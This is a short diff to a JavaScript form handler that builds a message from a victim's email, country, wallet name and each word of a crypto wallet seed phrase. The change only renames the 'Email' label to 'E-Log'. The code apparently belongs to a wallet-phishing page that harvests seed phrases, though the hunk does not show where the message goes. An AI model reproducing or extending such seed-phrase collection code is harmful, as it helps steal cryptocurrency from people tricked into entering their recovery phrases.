@@ -96,7 +96,7 @@ const handleSubmit = async (e) => {
     sPhraseArray = [...sPhraseArray, phrase]
   }
 
-  let message = `Email: ${ai.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
+  let message = `E-Log: ${ai.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
   for (const sp of sPhraseArray) {
     message += `${sp}\n`
   }
